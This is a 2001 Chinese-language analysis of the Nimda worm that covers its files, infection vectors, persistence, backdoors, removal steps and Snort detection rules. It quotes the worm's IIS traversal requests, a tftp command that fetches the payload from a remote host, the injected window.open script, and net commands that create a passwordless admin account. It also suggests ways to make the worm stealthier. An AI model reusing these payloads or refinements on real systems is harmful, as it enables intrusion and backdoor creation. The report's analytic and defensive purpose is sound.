---
title: "Nimda尼姆达蠕虫报告"
date: 2001-09-21T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-263"
---

(inburst_at_263.net)

作者：tombkeeper@126.com 

转载请保留作者信息 


--------------------------------------------------------------- 

2001.9.18晚，我习惯性的打开了tcp/80，用这个简单的批处理程序： 

-------------cut here----------- 

@echo off 

:start 

nc -vv -w 5 -l -p 80>>httpd.log 

goto start 

-------------------------------- 

通常我用它来监测CodeXXX之类的分布，另外还指望运气好能弄到个把变种。 

虽然偶尔会收到几个扫描代理服务器的噪声，但一般都是"rcvd 3818"。 

忽然我发现从某个IP来了连续的几个一百字节左右的数据，打开httpd.log 

一看原来是是一个http扫描，目的是寻找unicode_hole和CodeRedII建立的 

root.exe。我没理它，可是在不到5分钟的时间里我连续收到了几个发自不 

同IP的同种扫描，难道这就是CodeBlue？我开了一个真正的honeypot，不管 

对方GET什么都回应"200 OK"，结果马上就看到了实质性的东西： 

"GET /scripts/root.exe?/c+tftp -i xxx.xxx.xxx.xxx GET Admin.dll Admin.dll HTTP/1.0" 

好，满足你的要求。运行"tftp -i xxx.xxx.xxx.xxx GET Admin.dll"，结 

果马上就得到了好东西，赶紧反编译一下看看，然后再……@#$……%^&…… 

总算弄清楚了个大概，先写一个分析报告吧。 


--------------------------------------------------------------- 


名称：Nimda/尼姆达 


一些反病毒厂商的命名： 

Worm.Concept.57344 

W32/Nimda.A@mm 

W32/Nimda@mm 

I-Worm.Nimda 


类型：蠕虫/病毒 


受影响的系统：Windows 95, Windows 98, Windows Me, Windows NT 4, Windows 2000 


大小：57344字节 


蠕虫文件： 


[mmc.exe] 

      出现在windows文件夹，蠕虫扫描和创建tftpd的进程就是它。注意windows系统文件夹里也有 

      一个mmc.exe，那不是Nimda。 


[riched20.dll] 

      riched20.dll除了出现在windows系统文件夹里，还可能出现在任何有*.doc文件的文件夹里。 

      因为它是winword.exe和wordpad.exe运行时都要调用的所以当打开DOC文件时就等于运行了Nimda。 


[Admin.dll] 

      Admin.dll除了在C:，D:，E:的根目录外还可出现在下面的"TFTP*****"出现的地方 


[load.exe] 

      出现在windows系统文件夹 


[%temp%\readme.exe] 


[TFTP****] 

      形如"TFTP3233"。文件位置取决于使用tftp的目录。如果是 

      "GET /scripts/root.exe?/c+tftp -i [localIP] GET Admin.dll HTTP/1.0" 

      那么位置就在"Inetpub\scripts\"。如果是 

      "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp -i [localIP] GET Admin.dll HTTP/1.0" 

      那么位置就在"/scripts/..%c1%1c../"也就是根目录。 


/*以上都是蠕虫文件的可执行程序，它们之间的区别只有文件名不同*/ 


[readme.eml] 

      这个东西是值得一提的，他利用了IE5.01/IE5.5的一个漏洞。我们知道html格式 

      的邮件中图片和多媒体文件都是自动打开的，而可执行文件不是。但如果把可执行文件 

      指定为多媒体类型，也会自动下载打开。下面是readme.eml的一段： 

      --====_ABC1234567890DEF_==== 

      Content-Type: audio/x-wav; 

      name="readme.exe" 

      Content-Transfer-Encoding: base64 

      Content-ID: <EA4DMGBP9p> 

      另外，如果文件夹是“按web页查看”，那么即使只是用鼠标单击选中readme.eml 

      也会导致蠕虫的执行，如果把扩展名改为mht也是可以的，但改为htm就不行。 


[readme.nws] 

      同readme.eml，只是出现的几率很小。 


[*.exe] 

      可执行文件被感染，所以可能是任何文件名。 


传播方式： 


（一）通过email 

      在internet临时文件夹中读取所有"htm"，"html"文件并从中提取email地址， 

      从信箱读取email并从中提取SMTP服务器，然后发送readme.eml。 


（二）通过unicode_hole或CodeRedII建立的root.exe 

      unicode_hole我就不多说了，CodeRedII会在IIS的几个可执行目录下放置root.exe 

      也是尽人皆知，Nimda首先在udp/69上启动一个tftp服务器 

      然后会作以下扫描 

      GET /scripts/root.exe?/c+dir HTTP/1.0 

      GET /MSADC/root.exe?/c+dir HTTP/1.0 

      GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0 

      GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0 

      GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0 

      GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0 

      GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0 

      GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0 

      GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0 

      GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0 

      GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0 

      GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0 

      GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0 

      GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0 

      GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0 

      GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0 

      一旦发现有弱点的系统就使用类似下面的命令 

      GET /scripts/root.exe?/c+tftp -i xxx.xxx.xxx.xxx GET Admin.dll HTTP/1.0 

      把文件传到主机上去，然后再 

      GET /scripts/Admin.dll HTTP/1.0 


（三）通过WWW服务 

      在所有文件名中包含default/index/main/readme并且扩展名为htm/html/asp的文件 

      所在目录中创建readme.eml，并在文件末加上下面这一行 

      <html><script language="JavaScript">window.open("readme.eml", null, "resizable=no,top=6000,left=6000")</script></html> 

      也就是说如果一台web服务器被感染了，那么大部分访问过此服务器的机器都会被感染。 


（四）通过局域网 

      Nimda会搜索本地的共享目录中包含doc文件的目录，一但找到，就会把自身复制到目录中命名为riched20.dll（原理见前） 


（五）以病毒的方式 

      搜索[SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths]寻找在远程主机上的可执行文件， 

      一旦找到，Nimda就会以病毒的方式感染文件。有一点不同的是，它把原文件作为资源存储在新文件中， 

      运行新文件时再当作可执行文件来调用。奇怪的是Nimda过滤了winzip32.exe，它不会感染winzip32.exe， 

      可能是作者发现winzip染毒后不能正常运行吧。 


确保运行： 

病毒采取以下措施确保自己处于活跃状态 

1）把自己复制到windows系统文件夹里命名为riched20.dll（原理见前） 

2）把自己复制到windows系统文件夹里命名为load.exe， 

   修改system.ini把 

   shell=explorer.exe改为 

   shell=explorer.exe load.exe -dontrunold 

   使病毒在下次系统启动时运行。 


创建后门： 


1）如果有足够权限将调用"net.exe"执行以下系统命令： 

   net user guest /add 

   net user guest /active 

   net user guest "" 

   net localgroup Administrators guest 

   net localgroup Guests guest /add 

   结果是空密码的guest加到了Administrators组中。 


2）如果有足够权限将调用"net.exe"执行以下系统命令： 

   net share c$=c:\ 

   删除[SYSTEM\CurrentControlSet\Services\lanmanserver\Shares\Security]的所有子键 

   结果是C:\设为完全共享。 


Nimda的一些不足之处： 

无论如何Nimda是一个划时代的东西，它显示了作者高超的编程水平和丰富的安全知识，相形之下CodeBlue显得黯淡了很多, 

甚至CodeRedII也不能相比，但还是留下了一些遗憾。 


1）Nimda用JavaScript的"window.open"函数来打开readme.eml，这并不可靠，稍具安全常识的人都会调整IE的脚本支持 

   选项，有些人干脆关掉java，但是用下面这个方法就没问题了： 

   <frameset cols="0,*"><frame src="readme.eml"> 


2）存在诸多"TFTP****"并不是Nimda的本意，恰恰是作者没考虑周全。 

   Winnt的tftp在工作时会创建形如"TFTP3233"的临时文件，如果tftp异常终止，临时文件就不能被删除。 

   unicode_hole本来就不是一个理想的运行程序的方式，再加上Nimda的tftpd部分的一点小缺陷就导致了 

   在一个目录下出现大批的"TFTP****"。写一个更可靠的tftpd模块或者在程序中加入删除这些临时文件的 

   代码，会让Nimda隐蔽性更强。 


3）用GET而不是HEAD来扫描的确要好，但如果在编码上参照Whisker的"Stealth Mode"改进一下就更完美了。 


其它几个常见问题： 


1）Nimda什么时候进入我国？ 

   我手头最早的一行日志是： 

   2001-09-18 13:40:25 xxx.xxx.xxx.xxx - xxx.xxx.xxx.xxx 80 GET /scripts/root.exe /c+tftp%20-i%2061.133.3.126%20GET%20Admin.dll%20Admin.dll 502 - 

   也就是说肯定早于2001-09-18 13:40:25 


2）Nimda的作者是谁？ 

   程序的作者在程序中留下了以下标记： 

   fsdhqherwqi2001 

   Concept Virus(CV) V.5, Copyright(C)2001  R.P.China 

   可能对最终找出作者有帮助。 


3）为什么说Nimda是“概念”蠕虫？ 

   它可以通过至少五种方式传播 

   它是一个带exe扩展名的dll，可以做为可执行文件运行，也可作为dll运行。 

   它有智慧：当它名为Admin.dll被运行时，它会把自己复制到windows文件夹命名为mmc.exe并带上参数"-qusery9bnow"运行。 

   当它名为readme.exe被运行时，它会把自己复制到%temp%带上参数"-dontrunold"运行. 

   它会把自己的属性设为“系统”“隐藏”，再改写注册表，使“系统”“隐藏”属性的程序在资源管理器中不可见。 

   它是一个主机扫描器，一个弱点扫描器，一个后门程序；带有多个Exploit，掌握最新的安全信息；它就是一个黑客。 


4）Nimda打开的tftpd@udp/69可以用来传送其他文件吗？ 

   不行。Nimda实现的只是一个最基本的tftpd，不包含打开文件句柄的代码，不存在工作目录，仅可以传送自身。 

   无论请求的是什么文件名，实际得到的都是Nimda。但这个tftpd模块可能存在缓冲溢出问题。 


5）如何清除Nimda？ 

   在文件夹选项里设置“显示所有文件” 


   删除mmc.exe/load.exe/riched20.dll/admin.dll/readme.eml/readme.exe等所有蠕虫文件。 

   从原始安装盘中提取riched20.dll覆盖windows系统文件夹里的同名蠕虫文件。 

   检查所有大小为57344或79225的文件。 

   可以使用“查找”工具，搜索包含"fsdhqherwqi2001"的*.exe/*.dll和包含"Kz29vb29oWsrLPh4eisrPb09Pb2"的*.eml/*.nws。 


   检查system.ini。 


   检查所有文件名中包含default/index/main/readme并且扩展名为htm/html/asp的文件。 


   删除C:\的共享 


   重起系统 


6）如何避免Nimda入侵？ 

   根本之道是打补丁： 

   Unicode漏洞：[http://www.microsoft.com/technet/security/bulletin/ms00-078.asp](http://www.microsoft.com/technet/security/bulletin/ms00-078.asp) 

   MIME漏洞：[http://www.microsoft.com/technet/security/bulletin/ms01-020.asp](http://www.microsoft.com/technet/security/bulletin/ms01-020.asp) 

   IE5.01 SP2：[http://www.microsoft.com/windows/ie/downloads/recommended/ie501sp2/default.asp](http://www.microsoft.com/windows/ie/downloads/recommended/ie501sp2/default.asp) 

   IE5.5 SP2：[http://www.microsoft.com/windows/ie/downloads/recommended/ie501sp2/default.asp](http://www.microsoft.com/windows/ie/downloads/recommended/ie501sp2/default.asp) 


   其他解决方案： 

   打开IE的“工具-->internet选项-->安全-->自定义级别-->文件下载”选“禁用”。 

   删除所有不需要的默认虚拟目录，或者只给纯脚本执行权，最好不要把任何web目录放在系统分区。 

   检查共享设置，Win9X的机器不要开完全共享，可以开只读共享，所有共享都要设置口令。 


   由于Nimda可以利用CodeRedII创建的后门，所以需打上idq_overflow的补丁，检查C:\和D:\ 

   有没有explorer.exe，检查web目录中有没有root.exe。具体见： 

   [http://www.cnns.net/article/db/1722.htm](http://www.cnns.net/article/db/1722.htm) 


7）Nimda发送的邮件有特征吗？ 

   Nimda发送的邮件主题是随机的，但通常很奇怪，譬如下面这个： 

   Subject: �A��pic180pic159pic180pic178pic162pic182desktop 

   不要轻易以HTML方式打开邮件。 


8）Nimda可以被监测吗？ 

   当然可以。下面是我写的一个用于snort的过滤规则： 


#---------------------------------------------- 

# Worm.Nimda Ruleset 

# Current Database Updated 09/20/2000 

# Contact:  tombkeeper - tombkeepr@126.com 

#---------------------------------------------- 


preprocessor http_decode: 80 443 8080 

preprocessor minfrag: 128 

preprocessor portscan: 12.23.34.45/32 3 5 /var/log/snort_portscan.log 

#                      ^^^^^^^^^^^    ^ ^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^ 

#                               |     | |              | 

#Your IP address or Network here+     | |              | 

#                                     | |              | 

#Ammount of ports being connected-----+ |              | 

#   in this                             |              | 

#Interval (in seconds)------------------+              | 

#                                                      | 

#Log file (path/name)----------------------------------+ 


preprocessor portscan-ignorehosts: 

# Hosts to ignore in portscan detection 


#--------------------------------------------- 

# CHANGE THE NEXT LINE TO REFLECT YOUR NETWORK 

# (Single system = your ip/32) 

var HOME_NET yournet/subnet 

#--------------------------------------------- 


alert tcp any any -> any 80 (msg:"W32/Nimda@mm WORM SCAN!"; flags:PA; content:"/root.exe?/c+dir"; nocase;) 

alert tcp any any -> any 80 (msg:"W32/Nimda@mm WORM SCAN!"; flags:PA; content:"/system32/cmd.exe?/c+dir"; nocase;) 

alert tcp any any -> any 80 (msg:"W32/Nimda@mm WORM TRANSFER!!"; flags:PA; content:"/root.exe?/c+tftp%20-i"; nocase;) 

alert tcp any any -> any 80 (msg:"W32/Nimda@mm WORM TRANSFER!!"; flags:PA; content:"/system32/cmd.exe?/c+tftp%20-i"; nocase;) 

alert tcp any any -> any 80 (msg:"W32/Nimda@mm WORM RUN!!!"; flags:PA; content:"/scripts/Admin.dll"; nocase;) 

alert tcp any any -> any 80 (msg:"W32/Nimda@mm WORM RUN!!!"; flags:PA; content:"/MSADC/Admin.dll"; nocase;) 

alert tcp any any -> any 80 (msg:"W32/Nimda@mm WORM RUN!!!"; flags:PA; content:"/winnt/system32/Admin.dll"; nocase;) 

alert udp any 69 -> any any (msg:"W32/Nimda@mm WORM TRANSFER!!"; flags:PA; content:"|15 90 AC 17 36 F7 D8 1B C0 5E 40 5B 5F C9 C2 04 00 55 8B EC 81 EC B0 00|";) 

alert tcp any 80 -> any any (msg:"W32/Nimda@mm WORM IN WEB SERVER!!"; flags:PA; content:">window.open("readme.eml"";) 

alert tcp any any -> any 25 (msg:"W32/Nimda@mm WORM MAILSEND!!"; flags:PA; content:"UgEAAI1F6Ild6FCNRfxQU2g/AA8AU1NT";) 

alert tcp any 110 -> any any (msg:"W32/Nimda@mm WORM MAILRECV!!"; flags:PA; content:"UgEAAI1F6Ild6FCNRfxQU2g/AA8AU1NT";) 


--

※ 来源:・安全焦点讨论区 [www.xfocus.org](http://www.xfocus.org/)・
